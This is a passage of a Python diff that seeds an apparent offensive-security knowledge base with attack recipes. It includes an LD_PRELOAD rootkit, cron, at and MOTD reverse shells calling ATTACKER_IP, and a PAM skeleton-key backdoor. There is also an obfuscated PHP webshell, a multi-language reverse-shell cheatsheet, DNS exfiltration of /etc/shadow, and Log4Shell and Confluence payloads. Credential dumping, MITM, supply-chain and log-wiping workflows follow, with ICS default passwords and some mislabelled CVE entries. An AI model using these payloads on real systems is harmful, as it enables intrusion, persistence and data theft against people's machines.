+            "command": "cat > /tmp/rootkit.c << 'EOF'\n#define _GNU_SOURCE\n#include <dlfcn.h>\n#include <unistd.h>\n#include <string.h>\n#include <stdlib.h>\nint execve(const char *path, char *const argv[], char *const envp[]) {\n    if(strstr(argv[0],\"sshd\")) { execl(\"/bin/bash\",\"bash\",\"-c\",\"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\",NULL); }\n    return ((int(*)(const char*,char *const*,char *const*))dlsym(RTLD_NEXT,\"execve\"))(path,argv,envp);\n}\nEOF\ngcc -shared -fPIC -o /usr/lib/liblog.so /tmp/rootkit.c -ldl && echo 'LD_PRELOAD=/usr/lib/liblog.so' >> /etc/environment",
+            "tools": ["gcc", "ld"],
+            "requires_auth": True,
+            "risk": "critical",
+        }, "internal"))
+        seed.append(("backdoor", "cron_reverse_shell", {
+            "name": "Cron Reverse Shell",
+            "command": "echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\" 2>/dev/null' | crontab -",
+            "tools": ["crontab"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+        seed.append(("backdoor", "pam_skeleton_key", {
+            "name": "PAM Backdoor (Skeleton Key)",
+            "command": "cp /lib/x86_64-linux-gnu/security/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so.bak && cat > /tmp/pam_backdoor.c << 'EOF'\n#include <stdio.h>\n#include <string.h>\nint pam_sm_authenticate(int flags, int argc, const char **argv) {\n    const char *pass = getpwnam(getenv(\"USER\"))->pw_passwd;\n    if(strcmp(pass,\"backdoor\")==0) return 0;\n    return 1;\n}\nEOF\ngcc -shared -fPIC -o /lib/x86_64-linux-gnu/security/pam_unix.so /tmp/pam_backdoor.c -lpam",
+            "tools": ["gcc", "pam"],
+            "requires_auth": True,
+            "risk": "critical",
+        }, "internal"))
+        seed.append(("backdoor", "at_job_persistence", {
+            "name": "AT Job Persistence",
+            "command": "echo \"/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\" | at now + 1 minute && atq",
+            "tools": ["at", "atq"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+        seed.append(("backdoor", "xinetd_backdoor", {
+            "name": "xinetd Backdoor Service",
+            "command": "cat > /etc/xinetd.d/backdoor << 'EOF'\nservice backdoor\n{\n    disable = no\n    socket_type = stream\n    wait = no\n    user = root\n    server = /bin/bash\n    flags = REUSE\n}\nEOF\nxinetd",
+            "tools": ["xinetd"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+        seed.append(("backdoor", "motd_script", {
+            "name": "MOTD Script Persistence",
+            "command": "chmod +x /etc/update-motd.d/00-header && cat > /tmp/shell.sh << 'EOF'\n#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 2>/dev/null &\nEOF\nmv /tmp/shell.sh /etc/update-motd.d/00-header && chmod +x /etc/update-motd.d/00-header",
+            "tools": ["bash"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+        seed.append(("backdoor", "webshell隐蔽", {
+            "name": "Obfuscated PHP Webshell",
+            "command": "<?php $a=str_replace('x','','xaxsxx_xsxxtx');$b=$_REQUEST['c'];@$a('',@$b);?>",
+            "tools": ["php"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+
+        # ══════════════════════════════════════════════════════
+        # MORE CVE PATTERNS (15)
+        # ══════════════════════════════════════════════════════
+        seed.append(("cve_pattern", "cve_2023_44228", {
+            "name": "Citrix Bleed (CVE-2023-4966)",
+            "severity": "critical",
+            "description": "Information disclosure in Citrix NetScaler ADC and Gateway allowing session token theft",
+            "affected": ["Citrix ADC < 14.1-8.5", "Citrix Gateway < 14.1-8.5"],
+            "exploit": "Use publicly available PoC to leak session cookies, hijack authenticated sessions",
+            "cve": "CVE-2023-4966",
+        }, "internal"))
+        seed.append(("cve_pattern", "cve_2024_3094", {
+            "name": "xz Utils Backdoor (CVE-2024-3094)",
+            "severity": "critical",
+            "description": "Malicious backdoor in xz/liblzma 5.6.0-5.6.1 allowing SSH auth bypass",
+            "affected": ["xz-utils 5.6.0", "xz-utils 5.6.1", "liblzma 5.6.0-5.6.1"],
+            "exploit": "Detect via: xz --version; strings /usr/lib/liblzma.so | grep 'H-Z'",
+            "cve": "CVE-2024-3094",
+        }, "internal"))
+        seed.append(("cve_pattern", "cve_2023_46604", {
+            "name": "Apache ActiveMQ RCE (CVE-2023-46604)",
+            "severity": "critical",
+            "description": "Remote code execution via ClassInfo deserialization in ActiveMQ OpenWire protocol",
+            "affected": ["ActiveMQ 5.15.x < 5.15.16", "ActiveMQ 5.16.x < 5.16.7", "ActiveMQ 5.17.x < 5.17.6"],
+            "exploit": "nmap -p61616 --script=activemq-info target; use public Java deserialization exploit",
+            "cve": "CVE-2023-46604",
+        }, "internal"))
+        seed.append(("cve_pattern", "cve_2023_22527", {
+            "name": "Atlassian Confluence RCE (CVE-2023-22527)",
+            "severity": "critical",
+            "description": "Template injection RCE in Confluence Server and Data Center",
+            "affected": ["Confluence < 8.5.4"],
+            "exploit": "Send OGNL injection payload via POST to /wiki/resolvers/titlesearch.action",
+            "cve": "CVE-2023-22527",
+        }, "internal"))
+        seed.append(("cve_pattern", "cve_2022_40684", {
+            "name": "FortiOS Authentication Bypass (CVE-2022-40684)",
+            "severity": "critical",
+            "description": "Path traversal in FortiOS allowing unauthenticated admin access",
+            "affected": ["FortiOS 7.0.0-7.0.6", "FortiProxy 7.0.0-7.0.3"],
+            "exploit": "curl -k -s 'https://target/api/v2/cmdb/system/admin/admin' -H 'Forwarded: for=\"[127.0.0.1]:8000\";by=\"[127.0.0.1]:9000\"'",
+            "cve": "CVE-2022-40684",
+        }, "internal"))
+        seed.append(("cve_pattern", "cve_2022_26134", {
+            "name": "Confluence OGNL Injection (CVE-2022-26134)",
+            "severity": "critical",
+            "description": "Unauthenticated OGNL injection RCE in Confluence Server",
+            "affected": ["Confluence 1.3.0-7.18.1"],
+            "exploit": "GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%27utf-8%27%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%27X-Cmd-Response%27%2C%23a%29%29%7D/",
+            "cve": "CVE-2022-26134",
+        }, "internal"))
+        seed.append(("cve_pattern", "cve_2021_44228", {
+            "name": "Log4Shell (CVE-2021-44228)",
+            "severity": "critical",
+            "description": "JNDI injection in Apache Log4j allowing RCE",
+            "affected": ["Log4j 2.0-beta9 to 2.14.1"],
+            "exploit": "Send ${jndi:ldap://attacker.com/a} in user-agent, header, or parameter",
+            "cve": "CVE-2021-44228",
+        }, "internal"))
+        seed.append(("cve_pattern", "cve_2021_34527", {
+            "name": "PrintNightmare (CVE-2021-34527)",
+            "severity": "critical",
+            "description": "Windows Print Spooler RCE allowing domain-wide compromise",
+            "affected": ["Windows Server 2019", "Windows 10", "Windows Server 2016"],
+            "exploit": "Use public PrintNightmare exploit or Metasploit module for LPE/RCE",
+            "cve": "CVE-2021-34527",
+        }, "internal"))
+        seed.append(("cve_pattern", "cve_2021_26855", {
+            "name": "ProxyLogon (CVE-2021-26855)",
+            "severity": "critical",
+            "description": "SSRF in Microsoft Exchange Server leading to RCE",
+            "affected": ["Exchange Server 2013", "Exchange Server 2016", "Exchange Server 2019"],
+            "exploit": "Chain with CVE-2021-27065 for file write and webshell deployment",
+            "cve": "CVE-2021-26855",
+        }, "internal"))
+        seed.append(("cve_pattern", "cve_2020_1472", {
+            "name": "Zerologon (CVE-2020-1472)",
+            "severity": "critical",
+            "description": "Netlogon privilege escalation allowing domain controller compromise",
+            "affected": ["Windows Server 2008-2019"],
+            "exploit": "Set machine account password to empty via MS-NRPC: python zerologon_tester.py DC_NAME DC_IP",
+            "cve": "CVE-2020-1472",
+        }, "internal"))
+        seed.append(("cve_pattern", "cve_2020_0787", {
+            "name": "Windows BITS EoP (CVE-2020-0787)",
+            "severity": "high",
+            "description": "Arbitrary file move in BITS allowing privilege escalation",
+            "affected": ["Windows 7-10", "Windows Server 2008-2019"],
+            "exploit": "Use BITS to create symbolic link and move files to arbitrary locations",
+            "cve": "CVE-2020-0787",
+        }, "internal"))
+        seed.append(("cve_pattern", "cve_2019_0708", {
+            "name": "BlueKeep (CVE-2019-0708)",
+            "severity": "critical",
+            "description": "RDP RCE in Windows Remote Desktop Services (wormable)",
+            "affected": ["Windows 7", "Windows Server 2008"],
+            "exploit": "Metasploit: use exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
+            "cve": "CVE-2019-0708",
+        }, "internal"))
+        seed.append(("cve_pattern", "cve_2023_4966", {
+            "name": "Citrix Bleed CVE-2023-4966",
+            "severity": "critical",
+            "description": "Buffer overflow in Citrix NetScaler leaking session tokens",
+            "affected": ["NetScaler ADC/Gateway < 14.1-8.5", "< 13.1-49.15"],
+            "exploit": "Use CVE-2023-4966 PoC to leak session cookies, replay for admin access",
+            "cve": "CVE-2023-4966",
+        }, "internal"))
+
+        # ══════════════════════════════════════════════════════
+        # ADVANCED POST-EXPLOITATION (10)
+        # ══════════════════════════════════════════════════════
+        seed.append(("post_exploit", "credential_dump_windows", {
+            "name": "Windows Credential Dumping",
+            "steps": [
+                "1. reg save HKLM\\SAM C:\\temp\\SAM.bak",
+                "2. reg save HKLM\\SYSTEM C:\\temp\\SYSTEM.bak",
+                "3. reg save HKLM\\SECURITY C:\\temp\\SECURITY.bak",
+                "4. python3 secretsdump.py -sam SAM.bak -system SYSTEM.bak -security SECURITY.bak LOCAL",
+                "5. Crack NTLM hashes with hashcat -m 1000",
+            ],
+            "tools": ["reg", "secretsdump.py", "hashcat"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "mitre"))
+        seed.append(("post_exploit", "token_impersonation", {
+            "name": "Windows Token Impersonation",
+            "steps": [
+                "1. whoami /priv  # Check for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege",
+                "2. Use PrintSpoofer: PrintSpoofer.exe -i -c cmd.exe",
+                "3. Use GodPotato: GodPotato.exe -cmd cmd.exe",
+                "4. Or JuicyPotato: JuicyPotato.exe -l 1337 -p cmd.exe -t *",
+                "5. Get SYSTEM shell via impersonated token",
+            ],
+            "tools": ["PrintSpoofer", "GodPotato", "JuicyPotato"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "mitre"))
+        seed.append(("post_exploit", "password_spray_ad", {
+            "name": "Active Directory Password Spray",
+            "steps": [
+                "1. Enumerate users: enum4linux -U target | grep 'User:'",
+                "2. Get user list: ldapsearch -x -H target -b 'dc=domain,dc=com' '(objectClass=user)' sAMAccountName",
+                "3. Spray common passwords: crackmapexec smb target -u users.txt -p 'Password1!' --continue-on-success",
+                "4. Try: Password1, Welcome1, Summer2024!, Company1!, etc.",
+                "5. Lockout-aware: spray 1 password per 30 min across all users",
+            ],
+            "tools": ["crackmapexec", "ldapsearch", "enum4linux"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+        seed.append(("post_exploit", "lateral_movement_wmi", {
+            "name": "WMI Lateral Movement",
+            "steps": [
+                "1. wmic /node:TARGET /user:admin /password:pass process call create 'cmd.exe /c whoami > C:\\temp\\out.txt'",
+                "2. Or use impacket: wmiexec.py domain/admin:pass@target",
+                "3. Upload tools: putty.exe to C:\\Windows\\Temp\\",
+                "4. Establish persistent shell via scheduled task",
+            ],
+            "tools": ["wmic", "wmiexec.py"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "mitre"))
+        seed.append(("post_exploit", "data_exfil_dns", {
+            "name": "Data Exfiltration via DNS",
+            "steps": [
+                "1. Encode data: base64 -w0 /etc/shadow | fold -w50",
+                "2. Split into chunks and exfil via DNS queries",
+                "3. Use DNSExfiltrator: python dnsexfiltrator.py -d attacker.com -f /etc/shadow",
+                "4. Or use iodine for DNS tunneling: iodined -f tunnel.attacker.com 10.0.0.1",
+                "5. Monitor on attacker side: tcpdump -i eth0 port 53",
+            ],
+            "tools": ["DNSExfiltrator", "iodine", "tcpdump"],
+            "requires_auth": True,
+            "risk": "critical",
+        }, "internal"))
+        seed.append(("post_exploit", "reverse_shell_variants", {
+            "name": "Reverse Shell Cheatsheet",
+            "payloads": [
+                "bash: bash -i >& /dev/tcp/IP/PORT 0>&1",
+                "python: python -c 'import socket,subprocess,os; s=socket.socket(); s.connect((\"IP\",PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\",\"-i\"])'",
+                "perl: perl -e 'use Socket;$i=\"IP\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")}'",
+                "nc: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f",
+                "php: php -r '$sock=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\")'",
+                "ruby: ruby -rsocket -e'f=TCPSocket.open(\"IP\",PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+                "lua: lua -e \"require('socket');require('os');t=socket.tcp();t:connect('IP','PORT');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
+            ],
+            "tools": ["bash", "python", "perl", "nc"],
+            "requires_auth": True,
+            "risk": "critical",
+        }, "internal"))
+        seed.append(("post_exploit", "linux_privesc_checklist", {
+            "name": "Linux Privilege Escalation Checklist",
+            "steps": [
+                "1. uname -a; cat /etc/os-release",
+                "2. sudo -l",
+                "3. find / -perm -4000 -type f 2>/dev/null  # SUID binaries",
+                "4. find / -writable -type f 2>/dev/null | head -20",
+                "5. cat /etc/crontab; ls -la /etc/cron*",
+                "6. ss -tlnp; netstat -tlnp",
+                "7. docker ps; docker images",
+                "8. cat /etc/passwd | grep -v nologin",
+                "9. env; cat /proc/self/environ",
+                "10. id; groups",
+            ],
+            "tools": ["linuxprivchecker", "linpeas.sh"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+
+        # ══════════════════════════════════════════════════════
+        # ADVANCED WIFI AND BLUETOOTH (8)
+        # ══════════════════════════════════════════════════════
+        seed.append(("wifi_attack", "wpa3_sae_downgrade", {
+            "name": "WPA3 to WPA2 Downgrade Attack",
+            "steps": [
+                "1. Capture SAE commit/confirm exchange",
+                "2. Force client to connect to rogue AP with WPA2 only",
+                "3. Capture 4-way handshake from WPA2 connection",
+                "4. Crack captured WPA2 handshake with hashcat -m 22000",
+            ],
+            "tools": ["hostapd", "aircrack-ng", "hashcat"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+        seed.append(("wifi_attack", "karma_mana_attack", {
+            "name": "Karma/MANA Attack",
+            "steps": [
+                "1. Set up rogue AP broadcasting victim's known SSIDs",
+                "2. Send deauth to real AP: aireplay-ng --deauth 10 -a real_bssid wlan0mon",
+                "3. Clients auto-connect to stronger signal (rogue AP)",
+                "4. Capture all traffic through rogue AP",
+                "5. Harvest credentials from unencrypted HTTP",
+                "6. Perform SSL stripping for HTTPS",
+            ],
+            "tools": ["hostapd-mana", "aireplay-ng", "sslstrip"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+        seed.append(("wifi_attack", "pmkid_attack", {
+            "name": "PMKID Clientless Attack",
+            "steps": [
+                "1. Capture PMKID directly from AP: hcxdumptool -i wlan0mon -o capture.pcapng --filterlist_ap=targets.txt --filtermode=2",
+                "2. Convert to hashcat format: hcxpcapngtool -o hash.hc22000 capture.pcapng",
+                "3. Crack: hashcat -m 22000 hash.hc22000 wordlist.txt",
+                "4. No client association required - works against any WPA2 AP",
+            ],
+            "tools": ["hcxdumptool", "hcxpcapngtool", "hashcat"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+        seed.append(("wifi_attack", "bt_sdr_sniff", {
+            "name": "Bluetooth Low Energy Sniffing",
+            "steps": [
+                "1. Scan BLE: hcitool lescan",
+                "2. Capture BLE traffic: btmon -w ble_capture.log",
+                "3. Use Ubertooth: ubertooth-btle -f -c channel",
+                "4. Decode BLE packets: wireshark -r ble_capture.pcap",
+                "5. Identify services and characteristics",
+                "6. Replay captured packets for replay attacks",
+            ],
+            "tools": ["hcitool", "btmon", "ubertooth"],
+            "requires_auth": True,
+            "risk": "medium",
+        }, "internal"))
+        seed.append(("wifi_attack", "rogue_dhcp", {
+            "name": "Rogue DHCP Server Attack",
+            "steps": [
+                "1. Set up rogue DHCP: dnsmasq --interface=eth0 --dhcp-range=10.0.0.100,10.0.0.200,255.255.255.0,12h --dhcp-option=3,10.0.0.1 --dhcp-option=6,10.0.0.1",
+                "2. Clients get rogue DNS pointing to attacker",
+                "3. Intercept all DNS queries",
+                "4. Redirect to phishing pages or capture credentials",
+            ],
+            "tools": ["dnsmasq"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+        seed.append(("wifi_attack", "evil_portal", {
+            "name": "Evil Portal with Captive Portal",
+            "steps": [
+                "1. Set up hostapd with WPA2",
+                "2. Configure dnsmasq for captive portal redirect",
+                "3. Serve phishing page on all HTTP requests",
+                "4. Capture WiFi password or credentials",
+                "5. Use Wifiphisher for automated phishing",
+            ],
+            "tools": ["hostapd", "dnsmasq", "Wifiphisher"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+
+        # ══════════════════════════════════════════════════════
+        # MITM AND NETWORK ATTACKS (8)
+        # ══════════════════════════════════════════════════════
+        seed.append(("exploit_pattern", "arp_spoof_mitm", {
+            "name": "ARP Spoofing Man-in-the-Middle",
+            "steps": [
+                "1. Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward",
+                "2. Start ARP spoofing: arpspoof -i eth0 -t TARGET GATEWAY",
+                "3. Capture traffic: tcpdump -i eth0 -w capture.pcap",
+                "4. Use mitmproxy for HTTPS interception",
+                "5. Harvest credentials: urlsnarf, dsniff",
+            ],
+            "tools": ["arpspoof", "mitmproxy", "dsniff", "tcpdump"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+        seed.append(("exploit_pattern", "dns_spoof", {
+            "name": "DNS Spoofing Attack",
+            "steps": [
+                "1. Set up DNS server with spoofed records: dnsmasq --address=/#/10.0.0.1",
+                "2. Combine with ARP spoofing to redirect DNS queries",
+                "3. Or poison DNS cache directly: dnschef --fakeip 10.0.0.1 --fakedomains google.com",
+                "4. Serve malicious content on spoofed domain",
+            ],
+            "tools": ["dnsmasq", "dnschef", "ettercap"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+        seed.append(("exploit_pattern", "llmnr_poisoning", {
+            "name": "LLMNR/mDNS/NBT-NS Poisoning",
+            "steps": [
+                "1. Start Responder: responder -I eth0 -wrf",
+                "2. Wait for name resolution requests or force with wmic /target",
+                "3. Capture NTLMv2 hashes from responding hosts",
+                "4. Crack with hashcat -m 5600",
+                "5. Or relay with ntlmrelayx for direct access",
+            ],
+            "tools": ["Responder", "hashcat", "ntlmrelayx"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+        seed.append(("exploit_pattern", "ssl_strip", {
+            "name": "SSL Strip Downgrade Attack",
+            "steps": [
+                "1. Enable IP forwarding",
+                "2. ARP spoof target",
+                "3. Start sslstrip: sslstrip -l 8080",
+                "4. Configure iptables: iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080",
+                "5. Monitor captured credentials on port 8080",
+            ],
+            "tools": ["sslstrip", "arpspoof", "iptables"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+        seed.append(("exploit_pattern", "vxlan_hijack", {
+            "name": "VXLAN Network Hijacking",
+            "steps": [
+                "1. Capture VXLAN traffic: tcpdump -i eth0 -w vxlan.pcap 'udp port 4789'",
+                "2. Decode VXLAN headers: tshark -r vxlan.pcap -Y vxlan",
+                "3. Inject crafted VXLAN frames into target network",
+                "4. If no authentication: inject ARP replies for MITM",
+            ],
+            "tools": ["tcpdump", "tshark", "scapy"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+        seed.append(("exploit_pattern", "vlan_hopping", {
+            "name": "VLAN Hopping Attack",
+            "steps": [
+                "1. Craft double-tagged frame: scapy Ether(dst='ff:ff:ff:ff:ff:ff',type=0x8100)/Dot1Q(vlan=1)/Dot1Q(vlan=target_vlan)/IP()/ICMP()",
+                "2. Send via spoofed trunk negotiation: DTP frames",
+                "3. Switch becomes trunk port, all VLANs accessible",
+                "4. Access target VLAN and perform MITM",
+            ],
+            "tools": ["scapy", "yersinia"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+        seed.append(("exploit_pattern", "ipv6_spoofing", {
+            "name": "IPv6 Router Advertisement Spoofing",
+            "steps": [
+                "1. Send Router Advertisement: fake_router6 -i eth0 -r fd00::1/64",
+                "2. All IPv6 hosts on segment configure attacker as default gateway",
+                "3. Capture IPv6 traffic: tcpdump -i eth0 ip6",
+                "4. Combine with DNSv6 spoofing for full MITM",
+            ],
+            "tools": ["fake_router6", "tcpdump"],
+            "requires_auth": True,
+            "risk": "high",
+        }, "internal"))
+
+        # ══════════════════════════════════════════════════════
+        # MORE ATTACK WORKFLOWS (8)
+        # ══════════════════════════════════════════════════════
+        seed.append(("workflow", "wifi_crack_full_chain", {
+            "name": "WiFi to Network Pivot Workflow",
+            "phases": [
+                "1. Recon: airodump-ng --scan 10s to find networks",
+                "2. Target selection: pick open or weak network",
+                "3. Capture: airodump-ng --bssid TARGET -c CHANNEL -w cap",
+                "4. Deauth: aireplay-ng --deauth 10 -a TARGET wlan0mon",
+                "5. Crack: aircrack-ng -w rockyou.txt cap-01.cap",
+                "6. Connect: iwconfig wlan0 essid NAME key PASSWORD",
+                "7. Pivot: nmap -sn INTERNAL_NET/24",
+                "8. Deep scan: nmap -sV -sC -T4 discovered_hosts",
+            ],
+            "tools": ["aircrack-ng", "nmap", "iwconfig"],
+            "requires_auth": True,
+            "estimated_time": "2-8 hours",
+        }, "internal"))
+        seed.append(("workflow", "phishing_to_domain_admin", {
+            "name": "Phishing to Domain Admin Workflow",
+            "phases": [
+                "1. Recon: enum4linux, theHarvester for emails and subdomains",
+                "2. Phishing: generate payload with msfvenom, send via email",
+                "3. Initial access: catch reverse shell, migrate to stable process",
+                "4. Enumerate: BloodHound, SharpHound for AD paths",
+                "5. Credential harvest: Mimikatz, LaZagne",
+                "6. Lateral movement: Pass-the-Hash, Evil-WinRM",
+                "7. Escalate: Kerberoasting, DCSync, Golden Ticket",
+                "8. Persist: Golden Ticket, scheduled tasks, GPO",
+            ],
+            "tools": ["theHarvester", "msfvenom", "Mimikatz", "BloodHound"],
+            "requires_auth": True,
+            "estimated_time": "1-3 days",
+        }, "internal"))
+        seed.append(("workflow", "web_app_full_pwn", {
+            "name": "Web Application Full Compromise",
+            "phases": [
+                "1. Recon: subfinder -d target.com; httpx -l subs.txt",
+                "2. Crawl: gospider -s http://target -d 3 --other-source",
+                "3. Enum: gobuster dir -u http://target -w common.txt -x php,html,js",
+                "4. Vuln scan: nikto -h http://target; nmap --script http-vuln*",
+                "5. Auth test: hydra -l admin -P wordlist.txt http-post-form",
+                "6. SQLi: sqlmap -u 'http://target/?id=1' --dbs --batch",
+                "7. File upload: test with webshell variants",
+                "8. RCE: chain SSRF + file upload or deserialization",
+            ],
+            "tools": ["subfinder", "httpx", "gobuster", "nikto", "sqlmap", "msfconsole"],
+            "requires_auth": True,
+            "estimated_time": "4-12 hours",
+        }, "internal"))
+        seed.append(("workflow", "red_team_infrastructure", {
+            "name": "Red Team Infrastructure Setup",
+            "phases": [
+                "1. Set up C2: install Cobalt Strike or Sliver on VPS",
+                "2. Configure domain fronting: CDN -> VPS -> C2",
+                "3. Set up phishing: GoPhish with email templates",
+                "4. Redirector: nginx reverse proxy with TLS",
+                "5. Listener setup: HTTP, DNS, SMB listeners",
+                "6. Payload generation: staged/stageless for each OS",
+                "7. Operational security: burner emails, VPN, proxy chains",
+            ],
+            "tools": ["Sliver", "GoPhish", "nginx", "CloudFlare"],
+            "requires_auth": True,
+            "estimated_time": "1-2 days",
+        }, "internal"))
+        seed.append(("workflow", "wireless_full_audit_workflow", {
+            "name": "Complete Wireless Environment Audit",
+            "phases": [
+                "1. Widen survey: airodump-ng for all APs in range",
+                "2. Client enumeration: identify all connected clients",
+                "3. Evil twin: hostapd-wpe for credential capture",
+                "4. Handshake capture: targeted deauth + capture",
+                "5. WPS attack: reaver for PIN brute force",
+                "6. Enterprise test: freeradius-wpe for 802.1X",
+                "7. Report: all findings, risk levels, remediation",
+            ],
+            "tools": ["airodump-ng", "hostapd-wpe", "reaver", "aircrack-ng"],
+            "requires_auth": True,
+            "estimated_time": "6-16 hours",
+        }, "internal"))
+        seed.append(("workflow", "cloud_red_team_aws", {
+            "name": "AWS Red Team Workflow",
+            "phases": [
+                "1. Enumerate: pacu for AWS enumeration",
+                "2. Access keys: check for exposed keys in repos, configs",
+                "3. Lateral movement: assume roles, create users",
+                "4. Data access: S3 bucket enumeration, RDS access",
+                "5. Persistence: create backdoor IAM users, Lambda triggers",
+                "6. Privilege escalation: attach admin policies",
+                "7. Cover: delete CloudTrail logs, modify timestamps",
+            ],
+            "tools": ["pacu", "aws-cli", "ScoutSuite"],
+            "requires_auth": True,
+            "estimated_time": "2-5 days",
+        }, "internal"))
+        seed.append(("workflow", "supply_chain_attack", {
+            "name": "Software Supply Chain Attack",
+            "phases": [
+                "1. Target identification: popular open source package or dependency",
+                "2. Compromise: typosquatting, maintainer account takeover",
+                "3. Injection: add malicious code to build scripts or source",
+                "4. Distribution: publish to package registry",
+                "5. Wait: let users install/update automatically",
+                "6. Activation: trigger malicious payload on specific conditions",
+                "7. Exfiltrate: send collected data to C2",
+            ],
+            "tools": ["npm", "pip", "gem"],
+            "requires_auth": True,
+            "estimated_time": "1-4 weeks",
+        }, "internal"))
+
+        # ══════════════════════════════════════════════════════
+        # DEFAULT CREDENTIALS EXPANDED (3)
+        # ══════════════════════════════════════════════════════
+        seed.append(("default_creds", "network_equipment", {
+            "name": "Network Equipment Default Credentials",
+            "credentials": [
+                "admin:admin (Cisco, Juniper, MikroTik, Ubiquiti)",
+                "admin:password (Fortinet, Palo Alto, SonicWall)",
+                "root:admin (Cisco ASA, pfSense, OPNsense)",
+                "admin:1234 (Huawei, ZTE, TP-Link)",
+                "admin: (empty) (Netgear, D-Link, Linksys)",
+                "root:root (Arista, Cumulus)",
+                "super:sp-admin (HPE, Aruba)",
+                "ubnt:ubnt (Ubiquiti UniFi)",
+                "admin:admin123 (MikroTik RouterOS)",
+            ],
+            "tools": ["hydra", "medusa", "ncrack"],
+        }, "internal"))
+        seed.append(("default_creds", "cameras_nvr", {
+            "name": "Camera/NVR Default Credentials",
+            "credentials": [
+                "admin:admin (Hikvision, Dahua, Axis)",
+                "admin:12345 (Uniview, Tiandy)",
+                "admin:password (Amcrest, Foscam, Reolink)",
+                "root:xc3511 (Generic Chinese cameras)",
+                "admin: (empty) (Vivotek, Geovision)",
+                "root:root (Axis cameras, older firmware)",
+                "admin:888888 (Chinese NVR/DVR)",
+                "admin:fliradmin (FLIR cameras)",
+            ],
+            "tools": ["hydra", "curl"],
+        }, "internal"))
+        seed.append(("default_creds", "scada_ics", {
+            "name": "SCADA/ICS Default Credentials",
+            "credentials": [
+                "admin:admin (Siemens S7, Schneider)",
+                "USER:USER (Allen-Bradley, Rockwell)",
+                "admin:password (ABB, Emerson)",
+                "root:root (Beckhoff, Wago)",
+                "Administrator: (empty) (GE Fanuc)",
+                "admin:default (Honeywell, Yokogawa)",
+                "operator:operator (Wonderware, iFix)",
+            ],
+            "tools": ["hydra", "mbtget"],
+        }, "internal"))
+
+        # ══════════════════════════════════════════════════════
+        # UTILITY REFERENCES EXPANDED (5)
+        # ══════════════════════════════════════════════════════
+        seed.append(("utility", "hashcat_full_modes", {
+            "name": "Hashcat Mode Reference",
+            "modes": {
+                "0": "MD5",
+                "100": "SHA1",
+                "1400": "SHA2-256",
+                "1700": "SHA2-512",
+                "1800": "sha512crypt ($6$)",
+                "3200": "bcrypt ($2*)",
+                "5500": "NetNTLMv1 / NetNTLMv1+ESS",
+                "5600": "NetNTLMv2",
+                "7300": "IPMI2 RC-HMAC",
+                "7500": "Kerberos 5 AS-REQ Pre-Auth (etype 23)",
+                "13100": "Kerberos 5 TGS-REP (etype 23)",
+                "18200": "Kerberos 5 AS-REP (etype 23)",
+                "22000": "WPA-PBKDF2-PMKID+EAPOL",
+                "2500": "WPA-EAPOL-PBKDF2 (legacy)",
+                "2611": "vBulletin < 3.8.5",
+                "12100": "SMF (Simple Machines Forum) > v1.1",
+                "400": "phpass (WordPress, phpBB3)",
+            },
+        }, "internal"))
+        seed.append(("utility", "port_forwarding_methods", {
+            "name": "Port Forwarding Methods",
+            "methods": {
+                "ssh_local": "ssh -L 8080:target:80 user@gateway",
+                "ssh_remote": "ssh -R 8080:target:80 user@attacker",
+                "ssh_dynamic": "ssh -D 1080 user@gateway  # SOCKS proxy",
+                "socat": "socat TCP-LISTEN:8080,fork TCP:target:80",
+                "chisel": "chisel server --reverse; chisel client attacker:8080 R:socks",
+                "ligolo": "ligolo-proxy; ligolo-agent -connect attacker:11601 -retry",
+                "nc": "nc -lvp 8080 | nc target 80  # bidirectional pipe",
+            },
+        }, "internal"))
+        seed.append(("utility", "msfvenom_payloads", {
+            "name": "MSFvenom Payload Reference",
+            "payloads": {
